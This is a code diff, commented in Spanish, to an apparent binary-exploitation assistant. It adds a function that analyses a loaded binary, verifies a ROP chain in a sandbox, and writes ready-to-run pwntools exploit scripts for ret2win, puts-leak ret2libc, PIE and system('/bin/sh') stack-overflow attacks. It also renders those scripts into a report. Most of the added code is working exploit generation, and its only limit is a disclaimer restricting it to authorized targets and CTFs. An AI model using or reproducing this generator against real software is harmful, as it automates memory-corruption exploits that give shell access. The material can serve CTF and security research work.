@@ -34,6 +34,11 @@ class ExploitPlan:
     mitigations: List[str] = field(default_factory=list)   # a sortear (y como)
     kb_refs: List[str] = field(default_factory=list)       # cheat sheets del RAG relevantes
     note: str = ""
+    # concrecion con un binario cargado (si se pasa)
+    concrete: dict = field(default_factory=dict)   # {offset, gadgets, win, system, chain}
+    verified: bool = False                          # exploit verificado por ejecucion en sandbox
+    proof: dict = field(default_factory=dict)       # {strategy, offset, base, win, marker, output}
+    script: str = ""                                # script pwntools reproducible (si hay verificado)
 
     @property
     def ok(self) -> bool:
@@ -176,6 +181,105 @@ def plan(text: str, facts: Optional[dict] = None, cve: str = "", lang: str = "es
     return pl
 
 
+def _pwn_script_from_proof(proof: dict, name: str = "target") -> str:
+    """Script pwntools reproducible a partir de la prueba de una cadena verificada."""
+    strat = (proof.get("strategy") or "").lower()
+    off = proof.get("offset")
+    win = proof.get("win")
+    base = proof.get("base")
+    H = ["#!/usr/bin/env python3",
+         "# binoracle: exploit reproducible - SOLO laboratorio/CTF autorizado",
+         f"# estrategia VERIFICADA: {strat}",
+         "from pwn import *",
+         "context.update(arch='amd64', os='linux')",
+         f"BINARY = './{name}'",
+         "elf = context.binary = ELF(BINARY, checksec=False)",
+         "io = process(BINARY)   # o: remote('HOST', PORT)"]
+    if off is None:
+        return "\n".join(H + ["# offset no resuelto"])
+    if "ret2win" in strat:
+        B = [f"OFFSET = {off}", "ret = next(elf.search(asm('ret'), executable=True), 0)",
+             f"payload = flat({{OFFSET: [ret, {win}]}})", "io.sendline(payload)", "io.interactive()"]
+    elif "leak" in strat:
+        B = [f"OFFSET = {off}", "rop = ROP(elf)", "rop.raw(rop.find_gadget(['ret']).address)",
+             "rop.puts(elf.got['puts']); rop.call(elf.sym['main'])",
+             "io.sendline(flat({OFFSET: rop.chain()}))",
+             "leak = u64(io.recvline().strip().ljust(8, b'\\x00'))",
+             "libc = elf.libc; libc.address = leak - libc.sym['puts']",
+             "rop2 = ROP(libc); rop2.system(next(libc.search(b'/bin/sh\\x00')))",
+             "io.sendline(flat({OFFSET: rop2.chain()}))", "io.interactive()"]
+    elif "pie" in strat:
+        B = [f"OFFSET = {off}", f"elf.address = {base or 0}  # sandbox ASLR-off (con ASLR real: leak)",
+             "binsh = next(elf.search(b'/bin/sh\\x00'), 0)", "rop = ROP(elf)",
+             "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
+             "rop.call(sysaddr, [binsh]) if sysaddr else rop.execve(binsh, 0, 0)",
+             "io.sendline(b'A'*OFFSET + rop.chain())", "io.interactive()"]
+    else:
+        B = [f"OFFSET = {off}", "binsh = next(elf.search(b'/bin/sh\\x00'), 0)", "rop = ROP(elf)",
+             "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
+             "rop.raw(rop.find_gadget(['ret']).address)",
+             "rop.call(sysaddr, [binsh]) if (sysaddr and binsh) else rop.execve(binsh, 0, 0)",
+             "io.sendline(flat({OFFSET: rop.chain()}))", "io.interactive()"]
+    return "\n".join(H + B)
+
+
+def plan_for_binary(binary: str, text: str = "", cve: str = "", lang: str = "es",
+                    verify: bool = True) -> ExploitPlan:
+    """Concreta el esquema con un binario cargado: rellena offset/gadgets/objetivo reales via el
+    Analizador de cadenas y, si `verify`, VERIFICA el exploit en sandbox (script + prueba). Si no se
+    da `text`, infiere la clase (overflow -> control de RIP) de los hechos del binario."""
+    import os
+    es = lang == "es"
+    facts = {}
+    an = None
+    try:
+        from ..oracles import build_registry
+        reg = build_registry(binary)
+        cs = reg.get("r2_checksec")
+        r = cs.run() if cs else None
+        if r and r.ok:
+            facts = {"nx": r.meta.get("nx"), "pie": r.meta.get("pic"),
+                     "canary": r.meta.get("canary"), "relro": r.meta.get("relro")}
+    except Exception:
+        pass
+    try:
+        from .chainanalyzer import analyze_chains
+        an = analyze_chains(binary, None, verify=verify, lang=lang)
+    except Exception:
+        an = None
+    # clase: del texto, o inferida (si el analizador halla control de RIP -> stack-overflow)
+    cls = classify_cve(text) or classify_cve(cve)
+    if not cls and an is not None and an.control.get("RIP"):
+        cls = "stack-overflow"
+    if not cls:
+        return plan(text or cve, facts, cve=cve, lang=lang)
+    pl = plan(text or ("stack overflow" if cls == "stack-overflow" else cls), facts, cve=cve, lang=lang)
+    pl.vuln_class = cls
+    if an is not None:
+        # concrecion: offset, gadgets, objetivo, y cadena verificada
+        ctrl = an.control
+        gd = ctrl.get("reg_gadgets") or {}
+        pl.concrete = {"offset": ctrl.get("rip_offset"),
+                       "reg_gadgets": {k: v.get("addr") for k, v in gd.items()},
+                       "pivot": ctrl.get("pivot_gadget"), "target": an.target,
+                       "gadgets_total": len(an.gadgets)}
+        vc = next((c for c in an.chains if getattr(c, "verified", False)), None)
+        if vc is not None:
+            pl.verified = True
+            pl.proof = vc.proof or {}
+            pl.concrete["chain"] = vc.name
+            pl.script = _pwn_script_from_proof(pl.proof, os.path.basename(binary))
+            pl.phases.append(Phase(
+                "Exploit VERIFICADO" if es else "VERIFIED exploit",
+                (f"cadena {vc.name} ejecutada en sandbox -> objetivo alcanzado" if es else
+                 f"chain {vc.name} executed in sandbox -> goal reached"),
+                (f"prueba: {'  '.join(f'{k}={v}' for k, v in pl.proof.items() if k != 'output' and v)}"
+                 if es else
+                 f"proof: {'  '.join(f'{k}={v}' for k, v in pl.proof.items() if k != 'output' and v)}"),
+                "script pwntools adjunto" if es else "attached pwntools script"))
+    return pl
+
+
 def render_plan(pl: ExploitPlan, lang: str = "es") -> str:
     es = lang == "es"
     if not pl.ok:
@@ -184,6 +288,27 @@ def render_plan(pl: ExploitPlan, lang: str = "es") -> str:
            (f" — {pl.cve}" if pl.cve else "")]
     out.append((f"- **Clase**: {pl.vuln_class}\n- **Primitiva**: {pl.primitive}" if es else
                 f"- **Class**: {pl.vuln_class}\n- **Primitive**: {pl.primitive}"))
+    # concrecion con el binario cargado (datos reales)
+    if pl.concrete:
+        c = pl.concrete
+        cl = [("**Concreto (binario)**:" if es else "**Concrete (binary)**:")]
+        if c.get("offset") is not None:
+            cl.append(("  - offset a RIP: " if es else "  - RIP offset: ") + f"`{c['offset']}`")
+        if c.get("reg_gadgets"):
+            cl.append("  - gadgets: " + ", ".join(f"{k.upper()}@`{v}`" for k, v in c["reg_gadgets"].items()))
+        if c.get("pivot"):
+            cl.append("  - pivot RSP: `" + str(c["pivot"]) + "`")
+        cl.append(("  - objetivo: " if es else "  - target: ") + f"`{c.get('target','?')}`"
+                  + f" ({c.get('gadgets_total',0)} gadgets)")
+        out.append("\n".join(cl))
+    if pl.verified:
+        out.append(("\n> **EXPLOIT VERIFICADO** por ejecucion en sandbox: cadena "
+                    f"`{pl.concrete.get('chain','?')}`, "
+                    + "  ".join(f"{k}={v}" for k, v in pl.proof.items() if k != "output" and v)
+                    if es else
+                    "\n> **VERIFIED EXPLOIT** by sandbox execution: chain "
+                    f"`{pl.concrete.get('chain','?')}`, "
+                    + "  ".join(f"{k}={v}" for k, v in pl.proof.items() if k != "output" and v)))
     out.append("\n### " + ("Fases" if es else "Phases"))
     for i, ph in enumerate(pl.phases, 1):
         out.append(f"{i}. **{ph.name}** — {ph.goal}\n   - " + ("como" if es else "how") + f": {ph.technique}"
@@ -194,6 +319,9 @@ def render_plan(pl: ExploitPlan, lang: str = "es") -> str:
     if pl.kb_refs:
         out.append("\n" + ("Referencias del conocimiento (RAG): " if es else "Knowledge refs (RAG): ")
                    + ", ".join(pl.kb_refs))
+    if pl.script:
+        out.append("\n### " + ("Exploit reproducible (pwntools)" if es else "Reproducible exploit (pwntools)")
+                   + "\n```python\n" + pl.script + "\n```")
     out.append("\n_" + ("Solo objetivos autorizados / CTF / research." if es else
                         "Authorized / CTF / research targets only.") + "_")
     return "\n".join(out)
